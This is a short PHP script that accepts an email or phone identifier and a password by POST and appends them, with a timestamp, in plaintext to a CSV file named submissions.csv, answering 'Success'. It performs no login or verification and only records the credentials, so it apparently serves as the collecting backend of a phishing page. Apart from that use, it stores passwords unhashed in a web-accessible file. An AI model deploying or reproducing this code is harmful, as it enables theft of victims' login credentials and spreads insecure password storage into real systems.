<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $identifier = htmlspecialchars(trim($_POST['identifier'] ?? ''));
    $password   = htmlspecialchars(trim($_POST['password'] ?? ''));
    $timestamp  = date("Y-m-d H:i:s");

    if (!empty($identifier)) {
        $dataFile = 'submissions.csv';
        
        // If file doesn't exist, create it and write CSV header
        if (!file_exists($dataFile)) {
            $header = ["Timestamp", "Email / Phone", "password"];
            $fp = fopen($dataFile, 'w');
            fputcsv($fp, $header);
            fclose($fp);
        }

        // Append record permanently
        $fp = fopen($dataFile, 'a');
        fputcsv($fp, [$timestamp, $identifier, $password]);
        fclose($fp);
        
        http_response_code(200);
        echo "Success";
    } else {
        http_response_code(400);
        echo "Invalid input";
    }
} else {
    http_response_code(405);
    echo "Method Not Allowed";
}
?>
